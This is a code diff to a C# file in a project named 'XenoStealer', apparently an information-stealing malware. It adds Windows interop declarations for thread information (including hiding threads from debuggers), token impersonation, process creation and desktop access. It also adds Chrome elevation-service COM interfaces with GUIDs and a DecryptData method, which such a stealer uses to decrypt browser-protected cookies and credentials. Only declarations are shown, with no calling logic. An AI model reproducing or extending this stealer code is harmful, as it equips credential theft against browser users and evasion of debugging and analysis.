@@ -329,6 +329,29 @@ namespace XenoStealer
             MaxSystemInfoClass = 0xD2
         }
 
+        public enum THREADINFOCLASS : uint
+        {
+            ThreadBasicInformation,
+            ThreadTimes,
+            ThreadPriority,
+            ThreadBasePriority,
+            ThreadAffinityMask,
+            ThreadImpersonationToken,
+            ThreadDescriptorTableEntry,
+            ThreadEnableAlignmentFaultFixup,
+            ThreadEventPair_Reusable,
+            ThreadQuerySetWin32StartAddress,
+            ThreadZeroTlsCell,
+            ThreadPerformanceCount,
+            ThreadAmILastThread,
+            ThreadIdealProcessor,
+            ThreadPriorityBoost,
+            ThreadSetTlsArrayAddress,
+            ThreadIsIoPending,
+            ThreadHideFromDebugger,
+            ThreadBreakOnTermination,
+            MaxThreadInfoClass,
+        }
 
         public struct UINTRESULT
         {
@@ -561,6 +584,202 @@ namespace XenoStealer
             public string targetAlias;
             [MarshalAs(UnmanagedType.LPWStr)]
             public string userName;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CLIENT_ID
+        {
+            public IntPtr UniqueProcess;
+            public IntPtr UniqueThread;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public class THREAD_BASIC_INFORMATION
+        {
+            public uint ExitStatus;
+            public IntPtr TebBaseAddress;
+            public CLIENT_ID ClientId;
+            public UIntPtr AffinityMask;
+            public int Priority;
+            public int BasePriority;
+        }
+
+        public enum SECURITY_IMPERSONATION_LEVEL
+        {
+            SecurityAnonymous,
+            SecurityIdentification,
+            SecurityImpersonation,
+            SecurityDelegation
+        }
+
+        public enum TOKEN_TYPE
+        {
+            TokenPrimary = 1,
+            TokenImpersonation
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_ELEVATION
+        {
+            public uint TokenIsElevated;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFOW
+        {
+            public uint cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            public ushort cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public uint dwProcessId;
+            public uint dwThreadId;
+        }
+
+        public enum DESKTOP_ACCESS : uint
+        {
+            DESKTOP_NONE = 0,
+            DESKTOP_READOBJECTS = 0x0001,
+            DESKTOP_CREATEWINDOW = 0x0002,
+            DESKTOP_CREATEMENU = 0x0004,
+            DESKTOP_HOOKCONTROL = 0x0008,
+            DESKTOP_JOURNALRECORD = 0x0010,
+            DESKTOP_JOURNALPLAYBACK = 0x0020,
+            DESKTOP_ENUMERATE = 0x0040,
+            DESKTOP_WRITEOBJECTS = 0x0080,
+            DESKTOP_SWITCHDESKTOP = 0x0100,
+            GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
+                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
+                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
+        }
+
+        public enum ProtectionLevel
+        {
+            PROTECTION_NONE = 0,
+            PROTECTION_PATH_VALIDATION_OLD = 1,
+            PROTECTION_PATH_VALIDATION = 2,
+            PROTECTION_MAX = 3,
+        }
+
+        // Define the IElevator interface
+        [ComVisible(true)]
+        [Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IElevator//all text stuff is a BSTR
+        {
+            int RunRecoveryCRXElevated(
+                string crxPath,
+                string browserAppId,
+                string browserVersion,
+                string sessionId,
+                uint callerProcessId,
+                out IntPtr processHandle);
+
+            int EncryptData(
+                ProtectionLevel protectionLevel,
+                IntPtr plaintext,
+                out IntPtr ciphertext, 
+                out uint lastError);
+
+            int DecryptData(
+                IntPtr ciphertext,
+                out IntPtr plaintext,
+                out uint lastError);
+        }
+
+        [ComVisible(true)]
+        [Guid("A2721D66-376E-4D2F-9F0F-9070E9A42B5F")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IElevatorBeta//all text stuff is a BSTR
+        {
+            int RunRecoveryCRXElevated(
+                string crxPath,
+                string browserAppId,
+                string browserVersion,
+                string sessionId,
+                uint callerProcessId,
+                out IntPtr processHandle);
+
+            int EncryptData(
+                ProtectionLevel protectionLevel,
+                IntPtr plaintext,
+                out IntPtr ciphertext,
+                out uint lastError);
+
+            int DecryptData(
+                IntPtr ciphertext,
+                out IntPtr plaintext,
+                out uint lastError);
+        }
+        
+        [ComVisible(true)]
+        [Guid("BB2AA26B-343A-4072-8B6F-80557B8CE571")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IElevatorDev//all text stuff is a BSTR
+        {
+            int RunRecoveryCRXElevated(
+                string crxPath,
+                string browserAppId,
+                string browserVersion,
+                string sessionId,
+                uint callerProcessId,
+                out IntPtr processHandle);
+
+            int EncryptData(
+                ProtectionLevel protectionLevel,
+                IntPtr plaintext,
+                out IntPtr ciphertext,
+                out uint lastError);
+
+            int DecryptData(
+                IntPtr ciphertext,
+                out IntPtr plaintext,
+                out uint lastError);
+        }
+
+        [ComVisible(true)]
+        [Guid("4F7CE041-28E9-484F-9DD0-61A8CACEFEE4")]
+        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        public interface IElevatorSxs//all text stuff is a BSTR
+        {
+            int RunRecoveryCRXElevated(
+                string crxPath,
+                string browserAppId,
+                string browserVersion,
+                string sessionId,
+                uint callerProcessId,
+                out IntPtr processHandle);
+
+            int EncryptData(
+                ProtectionLevel protectionLevel,
+                IntPtr plaintext,
+                out IntPtr ciphertext,
+                out uint lastError);
+
+            int DecryptData(
+                IntPtr ciphertext,
+                out IntPtr plaintext,
+                out uint lastError);
         }
 
     }
